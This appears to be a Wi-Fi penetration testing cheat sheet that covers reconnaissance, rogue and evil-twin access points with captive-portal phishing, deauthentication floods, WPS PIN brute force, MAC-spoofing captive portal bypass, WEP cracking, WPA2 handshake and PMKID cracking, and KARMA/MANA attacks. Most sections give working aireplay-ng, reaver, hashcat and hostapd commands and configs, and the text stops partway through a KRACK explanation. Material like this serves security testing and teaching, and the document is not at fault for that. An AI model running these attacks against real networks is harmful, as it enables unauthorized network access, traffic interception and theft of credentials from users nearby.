<p><img src="/images/supplicant.png" width="750"/></p>
<h1 id="recon">Recon</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo airodump-ng -i wlan0 -w reconfile --output-format csv
</span></code></pre></div>
<p>--&gt; Within airodump-ng you can press "<strong>a</strong>" key to display ap only / sta only / ap + sta</p>
<p>Scan 5Ghz using <em>a</em> band
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo airodump-ng --band a -i wlan1
</span></code></pre></div></p>
<h1 id="hidden-ssid">Hidden SSID</h1>
<h3 id="with-connected-clients">With Connected Clients</h3>
<ol>
<li>Run airodump-ng on the same channel as of SSID 
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>sudo airodump-ng wlan1 -c 11
</span></code></pre></div></li>
<li>Send deauth packets to clients</li>
<li>Client will send probe requests and AP will respond with probe response disclosing the SSID name</li>
</ol>
<h3 id="without-connected-clients">Without Connected Clients</h3>
<ol>
<li>Run dictionary attack</li>
<li>Popular <a href="https://github.com/ytisf/mdk3_6.1/blob/master/useful_files/common-ssids.txt">SSID</a> <a href="https://gist.github.com/jgamblin/da795e571fb5f91f9e86a27f2c2f626f">dictionary</a> from internet or create one</li>
<li>Run automated script to try to connect to each SSID</li>
</ol>
<h3 id="passive-sniffing">Passive Sniffing</h3>
<ul>
<li>Wireless interface into <em>monitor</em> mode (<strong>airmon-ng</strong>, <strong>iw</strong> utility)
--&gt; Wireless card can only be on <em>1 channel</em> at a time.  </li>
</ul>
<p><strong>Tools</strong>: Wireshark, tshark, termshark, tcpdump, airodump-ng, horst
- <a href="https://semfionetworks.com/wp-content/uploads/2021/04/wireshark_802.11_filters_-_reference_sheet.pdf">Wireshark WLAN filters cheat-sheet</a></p>
<h3 id="preferred-network-list-pnl">Preferred Network List (PNL)</h3>
<p>The PNL or Preferred Network List is a list of Wi-Fi network names (SSIDs) your device automatically trusts. (PNL is generated from the networks you have connected to over time)</p>
<ol>
<li>Sniff the PNL through probe request emitted by STA (Station/client)</li>
<li>Create fake access point with same SSID (Wi-Fi routeur, HostAPD, WiFiPhisher, BetterCap, EAPHammer, airbase-ng, <a href="https://www.sevenlayers.com/index.php/304-evil-captive-portal">nodogsplash</a>)</li>
<li>Redirect the connected STA to phishing page / Attack the client (windows client)</li>
</ol>
<p><img src="/images/pnl.png" width="500"/></p>
<p>Hostapd config file for open authentication Wi-Fi network
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>interface=wlan1
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>driver=nl80211
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>ssid=GuestCorpWifi
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>bssid=A5:C4:0D:6A:75:3A
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>channel=6
</span></code></pre></div></p>
<p>Hostapd config file for WPA2-PSK authentication
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>interface=wlan1
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>driver=nl80211
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>ssid=dex-net
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>wpa=2
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>wpa_passphrase=password
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>wpa_key_mgmt=WPA-PSK
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>rsn_pairwise=CCMP
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>channel=1
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>bss=wlan1_0
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>ssid=dex-network
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>wpa=2
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>wpa_passphrase=Password1
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>wpa_key_mgmt=WPA-PSK
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>rsn_pairwise=CCMP
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>channel=1
</span></code></pre></div></p>
<p>Launch fake open authentication Wi-Fi network
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>hostapd open.conf
</span></code></pre></div></p>
<p>--&gt; You can also use WiFi PineApple to setup a captive portal using the "Evil Portal" infusion.<br />
- https://wiki.wifipineapple.com/legacy/#!captive_portal.md
- https://github.com/kleo/evilportals</p>
<h1 id="open-network">Open Network</h1>
<h2 id="beacon-flood-attack">Beacon flood attack</h2>
<p>Beacon flood attack is more a nuisance attack linked to 802.11 protocol weaknesses.
- https://github.com/aircrack-ng/mdk4</p>
<p>You can randomly create SSID or give specific wordlist for SSID names.
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mdk4 wlan1 b -a -g -f ssid_names.txt
</span></code></pre></div></p>
<p><img src="/images/beaconflood.png" width="300"/></p>
<h2 id="deauthentication-attack">Deauthentication attack</h2>
<p>Deauthentication attack is possible because within WPA2 (PSK and Enterprise (MGT)) the management frames are not protected. Its also more of a nuisance attack but can be usefull (comparing to beacon flood) to deauthenticate an STA (station/client) to intercept WPA2-handshake or redirect STA (station/client) to authenticate against your fake <strong>Radius</strong> server (WPA2-Enterprise).  </p>
<p>--&gt; Deauthentication can also be usefull when bypassing Captive Portal, to force client to reconnect and get their MAC address.  </p>
<p>Deauth using aireplay-ng (-c : client is optional)
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>aireplay-ng -0 100 -a BSSID -c STA/CLIENT wlan1
</span></code></pre></div></p>
<h1 id="wps-pin">WPS Pin</h1>
<p><a href="https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf">Research paper</a></p>
<p>Checking within a capture the WLAN with WPS enable
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>wps.wifi_protected_setup_state==2
</span></code></pre></div></p>
<p>Install reaver
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo apt install reaver
</span></code></pre></div></p>
<p>Identify device using WPS
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo wash -i wlx00c0ca996340
</span></code></pre></div></p>
<p>Attacking specific BSSID
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo reaver -i wlx00c0ca996340 -c 1 -b C0:3C:04:02:16:48 -vv
</span></code></pre></div></p>
<h1 id="guest-network">Guest Network</h1>
<h3 id="guest-network-without-password">Guest network without password</h3>
<p>MAC based restriction or captive portal are bypassable security solution but providing Guest network without password can be worst.</p>
<ol>
<li>Verify the client connected within the guest network can see each other ()</li>
<li>Verify Guest network isolation with corporate Wi-Fi, or protected Wi-Fi (WPA/WPA2-PSK/WPA3/WPA2-Enterprise)</li>
<li>Verify Guest network isolation with internal corporate network IP range</li>
<li>Check if the public source IP from Guest network is the same as from internal corporate or corporate Wi-Fi with authentication</li>
<li>Check default creds on network components</li>
<li>Check for vulnerabilities (RCE,...) on network components</li>
</ol>
<p>--&gt; If client isolation is not in place, check to password spray on Windows hosts or attack them (MS17-010, EternalBlue...)</p>
<h3 id="mac-based-authentication-captive-portal-bypass">MAC based authentication (Captive Portal Bypass)</h3>
<ol>
<li>You <strong>first</strong> need to authenticate on the Open Wifi. You will then be redirected to the captive portal.</li>
<li>At this time you will need to find a connected STA/Client (you can send <strong>deauth</strong> to a BSSID hosting the open network to increase the chance of getting a valid MAC address from connected STA/Client)</li>
<li>MAC change you wlan interface MAC address</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ifconfig wlan1 down
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>macchanger -m D2:E9:6A:D3:B3:51 wlan1
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>ifconfig wlan1 up
</span></code></pre></div>
<h3 id="dns-tunneling">DNS Tunneling</h3>
<ul>
<li><a href="https://github.com/ricardojoserf/wifi-pentesting-guide#213-bypass-2-dns-tunnelling">DNS tunneling for Internet Access</a></li>
</ul>
<h3 id="network-isolation">Network Isolation</h3>
<ul>
<li>Validate the network isolation/segmentation between guest wi-fi, captive portal based authentication wi-fi and internal corporate network or Wi-Fi corporate network.</li>
</ul>
<h3 id="client-isolationseparation">Client isolation/separation</h3>
<ul>
<li>Validate the isolation between clients connected on the Open Network.</li>
</ul>
<h3 id="azure-ad-and-conditional-access-policy">Azure AD and conditional Access Policy</h3>
<p>Sometimes it is possible to bypass conditonal access policy for example regarding <em>MFA</em> which can be based on <em>Source IP Adress</em> or <em>Geolocation</em> from the <em>Guest Network</em>.  </p>
<p>This represents a vulnerability and could give to an attacker the ability to get a first foothold.</p>
<h3 id="guest-public-ip-vs-corporate-public-ip">Guest Public IP VS Corporate Public IP</h3>
<p>It is important to have a different exit public IP address for any guest regarding the internal network IP.  </p>
<p>--&gt; Validate the public IP address from any guest network and internal network is different.  </p>
<h3 id="fake-access-point-with-internet-access">Fake access point with internet access</h3>
<h1 id="wep">WEP</h1>
<ul>
<li>Wired Equivalent Privacy</li>
<li>Uses Rivest Cipher 4 (RC4) Stream cipher</li>
<li><strong>40</strong> Bit or <strong>104</strong> Bit shared key + <strong>24</strong> Bit IV concatenated to the Shared Key
  --&gt; <strong>64</strong> or <strong>128</strong> Bit encryption key</li>
</ul>
<p><img src="/images/wep.jpg" width="700"/></p>
<p><img src="/images/mpdu.png" width="700"/></p>
<h3 id="connecting-using-wpa_supplicant">Connecting using wpa_supplicant</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>wpa_supplicant -i wlan0 -c wep.conf
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>wpa_supplicant -B -i wlan0 -c wep.conf
</span></code></pre></div>
<p>wep.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>network={
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>    scan_ssid=1
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    ssid=&quot;WepCorpo&quot;
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>    key_mgmt=NONE
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>    wep_key0=&quot;Password123&quot;
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>    wp_tx_keyidx=0
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>}
</span></code></pre></div></p>
<h3 id="cracking-wep">Cracking WEP</h3>
<ul>
<li>250,000 IVs for cracking 64 bit WEP Key</li>
<li>1,500,000 IVs for cracking 128-bit WEP Key</li>
</ul>
<p>--&gt; You can do passive IV capture (but it will take time)<br />
OR
--&gt; Inject traffic to force more packets and more IVs (Replay Attack) 
- Capture ARP packet and send to AP, it will send reply.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>sudo airodump-ng -i wlan1 --bssid 14:D6:4D:26:73:96 -w wep
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>sudo aireplay-ng -3 -b 14:D6:4D:26:73:96 -h 66:B9:B8:1D:EC:66 wlan1
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>sudo aircrack-ng wep-01.ivs
</span></code></pre></div>
<p><img src="/images/wep_attack_arp_replay.png" width="800"/></p>
<h3 id="decrypt-traffic">Decrypt traffic</h3>
<p>Once the key is retrieve attacker can decrypt traffic for other devices.  </p>
<ul>
<li>WireShark (GUI)</li>
<li>Airdecap-ng (CLI)</li>
</ul>
<h3 id="wep-cracking-alternative">WEP Cracking alternative</h3>
<p>In case you don't have enought IVs to recover the key you can use dictionnary attack.  </p>
<p>Validate the current capture file
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>airodump-ng -r WEP-capture.cap
</span></code></pre></div></p>
<p>Creating the the hex wordlist from the password wordlist or use this <a href="https://gist.githubusercontent.com/tbhaxor/170894df0d43fd23eae49b0b20442c27/raw/3652d81819f13de7426167cf7390f051f5b30a4f/wep_decrypt.py">python script</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>for i in $(cat 1000000-password-seclists.txt); do echo $i | od -A n -t x1 | sed &#39;s/ *//g&#39;; done &gt;&gt; hex_wordlist.txt
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>python3 crack.py 1000000-password-seclists.txt WEP-Advanced.cap 00:21:91:D2:8E:25
</span></code></pre></div></p>
<p>Recover and decrypt traffic using hex(password) dictionnary and <a href="https://www.aircrack-ng.org/doku.php?id=airdecap-ng">airdecap-ng</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>for hex in $(cat hex_wordlist.txt); do airdecap-ng -w $hex WEP-capture.cap; done
</span></code></pre></div></p>
<h1 id="wpa-wpa2">WPA / WPA2</h1>
<ul>
<li>WPA TKIP (Based on WEP) - Intermediate solution by Wi-Fi Alliance / Hardware change not required</li>
<li>WPA2 CCMP (Based on AES)</li>
</ul>
<h3 id="tkip-temporary-key-integrity-protocol">TKIP - Temporary Key Integrity Protocol</h3>
<h3 id="4-way-handhsake-and-encryption-keys">4 way handhsake and encryption keys</h3>
<ul>
<li>PassPhrase (password)</li>
<li>PSK (Pre shared key)</li>
<li>PMK (Pairwise Master Key)</li>
<li>PTK (Pairwise Transient Key)</li>
<li>GTK (Group Temporal Key)</li>
<li>GMK (Group Master Key)</li>
</ul>
<p>--&gt; In PSK authentication, the PMK is the same thing as PSK. <em>PMK=PSK</em>.</p>
<p>WPA/WPA2 use <strong>PBKDF2</strong> (Password Based Key Derivation Function).    </p>
<p><em>PMK/PSK</em> = PBKDF2(PassPhrase, SSID, ssidLen, 4096, 256)<br />
--&gt; 4096 = Number of iterations or times the passphrase is hashed<br />
--&gt; 256 = Intended Key Length of PSK in bits </p>
<p><em>PTK</em> = PRF(PMK, ANonce, SNonce, Authenticator MAC, Supplicant MAC)<br />
- PMK - Pairwise Master Key
- ANonce - Random string generated by Access Point (AP)
- SNonce - Random string generated by client/station (STA)
- Authentication MAC - Access Point  MAC
- Supplicant MAC - Client/station MAC</p>
<p>--&gt; PRF is a pseudo-random function which is applied to all the input<br />
--&gt; <em>PTK is separate for every user</em></p>
<p><em>GTK</em> = Generated by Access Point and sent to client.<br />
- Same for all clients Connected to a BSSID
- USed for broadcast, multicast messages</p>
<p><img src="/images/keys2.png" width="500"/></p>
<p><img src="/images/4wayhandshake.png" width="500"/></p>
<p><img src="/images/keys.png" width="500"/></p>
<h3 id="wpa2-psk">WPA2-PSK</h3>
<p>One of the most known technic to attack WPA2-PSK (Pre Shared Key) is to deauthenticate clients and capture authentication handshake to further brute force it and try to recover clear text password.</p>
<p><img src="/images/wpa2_attack.png" width="500"/></p>
<h3 id="wpa2-deauthentication-attack-against-client">WPA2-Deauthentication attack (against client)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;CLIENT_MAC&gt; wlan1
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>sudo aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 -c 00:0F:B5:AE:CE:9D wlan1
</span></code></pre></div>
<h3 id="wpa2-deauthentication-attack-against-ap">WPA2-Deauthentication attack (against AP)</h3>
<p>If the <code>–c</code> (CLIENT_MAC) parameter is not specified when you run your deauth attack with aireplay-ng, all clients connected to the AP will be disconnected via deauthentication broadcast packet, but it is more effective to target a client individually.  </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; wlan1
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>sudo aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 wlan1
</span></code></pre></div>
<h5 id="capture-wpa2-handshake">Capture WPA2 Handshake</h5>
<p>In order to attack and crack WPA2 handshake you do not need to get full 4 way handshake. (Filter in Wireshark: <em>eapol</em>)<br />
--&gt; Airodump-ng will inform you when you capture a valid handshake.  </p>
<p>You will need the minimal following packets/message from 4 way handshake:
- ANonce (Message 1 and Message 3)
- SNonce (Message 2)</p>
<ol>
<li>Packet 1 and 2</li>
<li>Packet 2 and 3</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sudo airodump-ng wlan1 -c 11 --bssid 00:1C:10:00:00:00 -w ./capturePSK
</span></code></pre></div>
<h3 id="cracking-wpa2-handshake">Cracking WPA2 handshake</h3>
<h4 id="dictionnary-attack">Dictionnary attack</h4>
<p>Converting <strong>.CAP</strong> capture with handshake to <strong>hccapx</strong> hashcat format
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>sudo apt install git gcc
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>git clone https://github.com/hashcat/hashcat-utils.git
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>cd hashcat-utils/src/
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>gcc cap2hccapx.c -o cap2hccapx.bin
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>./cap2hccapx.bin wpa_handshake.cap handshake.hccapx
</span></code></pre></div></p>
<p>Dictionnary attack using hashcat
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>hashcat.exe -m 22000 handshake.hccapx wordlists/rockyou.txt
</span></code></pre></div></p>
<h4 id="pre-computed-pmk">Pre Computed PMK</h4>
<p>Pre computed PMK (Because PBKDF2 function is time consuming to proceed). You will still need to capture 4 Way handshake for SNonce, ANonce, AP MAC and Client MAC.
  - Require SSID and Passphrase (dictionnary)</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>genpmk -f wordlistPassphrase.txt -s CorpoWifi -d precomputed_PMK
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>cowpatty -d precomputed_PMK -s CorpoWifi -f wordlistPassphrase.txt
</span></code></pre></div>
<p><img src="/images/pre_computed.png" width="500"/></p>
<h3 id="wpa2-app-less-attack">WPA2 App Less Attack</h3>
<p>You will need to have a probing client within the vicinity or range, create a fake access point, wait the client for connect and capture the 4-way handshake.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>hostapd wpa-psk.conf
</span></code></pre></div>
<p>wpa1-psk.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>interface=wlan1
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>driver=nl80211
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>ssid=CorpoWifi
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>bssid=00:1C:10:00:00:00
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>wpa=2
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>wpa_passphrase=wedontcare
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>wpa_key_mgmt=WPA-PSK
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>rsn_pairwise=TKIP
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>channel=1
</span></code></pre></div></p>
<p>wpa2-psk.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>interface=wlan1
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>driver=nl80211
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>ssid=CorpoWifi
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>bssid=00:1C:10:00:00:00
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>wpa=2
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>wpa_passphrase=wedontcare
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>wpa_key_mgmt=WPA-PSK
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>rsn_pairwise=CCMP
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>channel=1
</span></code></pre></div></p>
<h3 id="karma-attack">KARMA Attack</h3>
<p>Attacker will look for client probe requests and immediately change the SSID it is broadcasting to match the probe request of the client. Responding to everyone.  </p>
<p>karma.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>interface=wlan1
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>ssid=nothing
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>channel=6
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>hw_mode=g
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>wpa=3
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>wpa_key_mgmt=WPA-EAP
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>wpa_pairwise=TKIP CCMP
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>auth_algs=3
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>ieee8021x=1
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>eapol_key_index_workaround=0
</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>eap_server=1
</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>eap_user_file=/root/certs/hostapd.eap_user
</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>ca_cert=/root/certs/server.pem
</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>server_cert=/root/certs/server.pem
</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>private_key=/root/certs/server.key
</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>private_key_passwd=
</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>dh_file=/root/certs/dhparam.pem
</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>mana_wpe=1
</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>mana_eapsuccess=1
</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>enable_mana=1
</span></code></pre></div></p>
<h3 id="pmkid-attack">PMKID Attack</h3>
<p>Traditional handshake capture and brute force methods wait for client to de-authenticate and re-authenticate while PMKID attack doesn’t. Direct PMKID is captured in this attack and then cracked.  </p>
<p>Many routers cache PMKID of exchange process in a collection of information PMKSA, so that the next time client de and re-authenticates 4-way handshake won’t be done again and router would directly ask the client for PMKSA, verify it and he would be re-associate it back with an access point.  </p>
<p>PMKID is a field in the RSN IE frame (Robust Security Network Information Element). RSN IE is an optional frame found in routers.  </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>apt install hcxtools
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>hcxdumptool -o PMKID_results -i wlan0mon
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>hcxpcaptool -z hashPMKID PMKID_results
</span></code></pre></div>
<p>Cracking PMKID hashes using hashcat (newer version of hashcat -m 22000)
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>hashcat -a 0 -m 16800 pmkid.txt ../../wordlists/wordlistsOnex/
</span></code></pre></div></p>
<h3 id="key-reinstallation-attack-krack">Key Reinstallation Attack (KRACK)</h3>
<ul>
<li>https://www.krackattacks.com/
KRACK attack or Key Reinstallation Attack. </li>
</ul>
<p><strong>Toolset</strong>: 
- https://github.com/vanhoefm/krackattacks-scripts<br />
- https://github.com/vanhoefm/krackattacks-poc-zerokey</p>
<p>When client joins a network it executes the 4-way handshake to negotiate a fresh encryption key (PTK).<br />
--&gt; The key will be install after receiving the message <strong>3</strong> of the <strong><em>4-way</em>* handshake.<br />
--&gt; In case message 3 is lost or dropped, the Access Point will retransmit </strong>message 3<strong> if it did not receive an appropriate response as aknowledgment<br />
--&gt; As a result client may receive </strong>message 3** multiple time, each time it will reinstall the same encryption key and reset the incremental transmit packet number (nonce)</p>
